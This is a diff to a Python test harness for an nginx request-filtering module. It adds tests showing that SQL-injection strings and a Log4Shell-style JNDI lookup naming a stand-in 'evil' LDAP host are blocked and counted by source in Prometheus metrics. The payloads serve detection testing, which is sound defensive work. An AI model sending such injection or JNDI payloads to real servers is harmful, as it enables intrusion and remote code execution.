@@ -25,7 +25,12 @@ from pathlib import Path
 
 @contextmanager
 def server(
-    binary: Path, module: Path | None, *, workers: int = 4, check_reload: bool = False
+    binary: Path,
+    module: Path | None,
+    *,
+    workers: int = 4,
+    check_reload: bool = False,
+    source_reload: bool = False,
 ):
     """Own one foreground master, its workers and its temporary prefix."""
     with tempfile.TemporaryDirectory(prefix="shield-metrics-") as directory:
@@ -57,6 +62,7 @@ http {{
     shield_ban_zone second:1m;
     shield_ban_zone refusals:1m;
     shield_ban_zone modes:1m;
+    shield_ban_zone sources:1m;
     server {{
         listen 127.0.0.1:{port};
         root {root}/html;
@@ -107,6 +113,16 @@ http {{
             empty_gif;
         }}
         location /mode-json {{ shield off; shield_ban_status modes; }}
+        location /source {{
+            shield block;
+            shield_body on;
+            shield_ban zone=sources count=99999 window=60s bantime=30s;
+            empty_gif;
+        }}
+        location /source-metrics {{
+            shield off; shield_ban_status sources;
+            shield_ban_status_format prometheus;
+        }}
         location /off {{ shield off; empty_gif; }}
         location /json {{ shield off; shield_ban_status main; }}
         location /metrics {{
@@ -154,6 +170,8 @@ http {{
                 yield port
                 if check_reload:
                     reload_controls(port, process, root)
+                if source_reload:
+                    source_reload_controls(port, process, root)
             finally:
                 if process.poll() is None:
                     process.send_signal(signal.SIGQUIT)
@@ -171,12 +189,16 @@ http {{
 
 
 def request(
-    port: int, path: str, headers: dict | None = None, method: str = "GET"
+    port: int,
+    path: str,
+    headers: dict | None = None,
+    method: str = "GET",
+    body: str | None = None,
 ) -> tuple[int, bytes]:
     """Make a bounded request and release its connection."""
     connection = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
     try:
-        connection.request(method, path, headers=headers or {})
+        connection.request(method, path, body=body, headers=headers or {})
         response = connection.getresponse()
         return response.status, response.read()
     finally:
@@ -240,6 +262,44 @@ def controls(port: int, output: Path) -> None:
         "live: exact inspections/refusals, four-worker snapshots, forced error, "
         "real slab exhaustion and eviction passed"
     )
+
+
+def source_controls(port: int, output: Path) -> None:
+    """Each request produces the expected bounded category/source series."""
+    assert request(port, "/source/union%20select%20pw")[0] == 403
+    assert request(port, "/source?id=union%20select%20pw")[0] == 403
+    assert request(port, "/source", {"User-Agent": "union select pw"})[0] == 403
+    assert (
+        request(port, "/source", {"X-Api-Version": "${jndi:ldap://evil/a}"})[0] == 403
+    )
+    assert (
+        request(
+            port,
+            "/source",
+            {"Content-Type": "application/x-www-form-urlencoded"},
+            "POST",
+            "q=union select password from users",
+        )[0]
+        == 403
+    )
+    assert request(port, "/source")[0] == 200
+    status, payload = request(port, "/source-metrics")
+    assert status == 200
+    (output / "source-metrics.om").write_bytes(payload)
+    samples = payload.decode().splitlines()
+    for category, source, count in (
+        ("sqli", "uri", 2),
+        ("sqli", "user-agent", 1),
+        ("template", "header", 1),
+        ("sqli", "body", 1),
+        ("sqli", "header", 0),
+    ):
+        expected = (
+            f'shield_source_hits_total{{zone="sources",category="{category}",'
+            f'source="{source}"}} {count}'
+        )
+        assert expected in samples, expected
+    print("source counters: URI, query, user-agent, header, body and benign passed")
 
 
 def mode_controls(port: int) -> None:
@@ -310,6 +370,25 @@ def redirect_controls(port: int) -> None:
         "redirects: index, named, off-to-active, A-to-B-to-A, URI reinspection "
         "and repeated ban refusal passed"
     )
+
+
+def source_reload_controls(port: int, process: subprocess.Popen, root: Path) -> None:
+    """Source series with nonzero hits survive a reload of the shared zone."""
+    before = request(port, "/source-metrics")[1]
+    marker = b'shield_source_hits_total{zone="sources",category="sqli",source="uri"} 2'
+    assert marker in before
+    config = root / "nginx.conf"
+    config.write_text(
+        config.read_text().replace('return 200 "before";', 'return 200 "after";')
+    )
+    process.send_signal(signal.SIGHUP)
+    deadline = time.monotonic() + 10
+    while request(port, "/reload-ready") != (200, b"after"):
+        assert time.monotonic() < deadline, (root / "error.log").read_text()
+        time.sleep(0.02)
+    after = request(port, "/source-metrics")[1]
+    assert before == after, "source counters changed after reload"
+    print("source counters: reload preserved nonzero series")
 
 
 def reload_controls(port: int, process: subprocess.Popen, root: Path) -> None:
@@ -429,6 +508,7 @@ def main() -> None:
     parser.add_argument("--output", type=Path, required=True)
     parser.add_argument("--baseline-module", type=Path)
     parser.add_argument("--benchmark-only", action="store_true")
+    parser.add_argument("--source-only", action="store_true")
     args = parser.parse_args()
     if args.benchmark_only and (not args.baseline_module or not args.module):
         parser.error("--benchmark-only requires --baseline-module and --module")
@@ -437,9 +517,13 @@ def main() -> None:
         with server(
             args.nginx.resolve(),
             args.module.resolve() if args.module else None,
-            check_reload=True,
+            check_reload=not args.source_only,
+            source_reload=args.source_only,
         ) as port:
-            controls(port, args.output)
+            if args.source_only:
+                source_controls(port, args.output)
+            else:
+                controls(port, args.output)
     if args.baseline_module:
         samples: dict[str, list[float]] = {"baseline": [], "candidate": []}
         # Alternate order across rounds to expose scheduling/drift noise.
